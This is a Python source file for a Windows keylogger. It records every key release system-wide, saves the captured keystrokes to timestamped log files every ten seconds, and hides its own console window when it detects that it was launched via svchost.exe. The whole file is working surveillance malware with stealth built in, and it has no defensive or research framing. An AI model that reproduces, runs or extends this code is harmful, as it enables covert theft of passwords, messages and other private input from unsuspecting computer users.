""" This file will register the keystrokes and write them in a file """
import os
from datetime import datetime
from os import chdir
from threading import Timer
import subprocess

import keyboard  # for key logs
import pyautogui

import win32gui
import win32con


class Keylogger:
    def __init__(self):
        self.filename = None
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetime
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.timer = None

        self.cleaner()  # cleaning empty files
        self.hide_window()  # Hiding window

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occurred
        (That is when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]\n"
        # finally, add the key name to our global `self.log` variable
        self.log += name + " "

    def update_filename(self):
        self.filename = f"Key_Logger {str(datetime.now()).replace(':', '').replace(' ', '-')}"

    def report_to_file(self):
        print("Reporting")
        """This method creates a log file in the current directory that contains
        the current key logs in the `self.log` variable"""
        # open the file in write mode (create it)
        print("Writing Log")
        chdir("Logs/")
        with open(f"{self.filename}.txt", "w") as f: f.write(self.log)
        chdir("../")
        print(f"[+] Saved Logs to {self.filename}.txt")

        self.timer = Timer(interval=10, function=self.report_to_file)
        # set the thread as daemon (dies when main thread die)
        self.timer.daemon = True
        self.timer.start()

    def start(self):
        self.update_filename()
        keyboard.on_release(callback=self.callback)
        self.report_to_file()
        print(f"{datetime.now()} - Started keylogger")

        keyboard.wait()

    def cleaner(self):
        """ This function will remove the empty files from the folder. """
        for folder, _, files in os.walk("Logs\\"):
            for file in files:
                if file.endswith(".txt") and file.startswith("Key_Logger") and file != self.filename:
                    to_remove = False
                    with open(f'Logs\\{file}', "r") as f:
                        if len(f.readlines()) == 0:
                            print(f"Removing {file}")
                            to_remove = True
                    if to_remove: os.remove(f"Logs\\{file}")

    def hide_window(self):
        """ This function will hide the window of keylogger : the code is definitely written by me """

        # finding the process window name
        parentShellName = self.filename
        # root process to look for parents until we find a process name
        parentPid = os.getpid()
        while 1:
            # In case of ipython the second parent process is the Shell, so we are looping!
            # Probably there should be a counter to finish the while loop in case no shell could be detected!
            cmd = 'wmic process where "ProcessId=%s" get parentprocessid /format:list' % parentPid
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            out, err = proc.communicate()
            key, parentPid = out.strip().decode('utf-8').split('=')

            cmd2 = 'wmic process where "ProcessId=%s" get name /format:list' % parentPid
            proc = subprocess.Popen(cmd2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            out, err = proc.communicate()
            key, parentShellName = out.strip().decode('utf-8').split('=')

            if 'python' not in parentShellName.lower():
                break
        if parentShellName == "svchost.exe":
            with pyautogui.hold("alt"): pyautogui.press("tab")
            hide = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(hide, win32con.SW_HIDE)
        else:
            print("This window will not be hidden for debugging purpose. ")


if __name__ == '__main__':
    keylogger = Keylogger()
    keylogger.start()
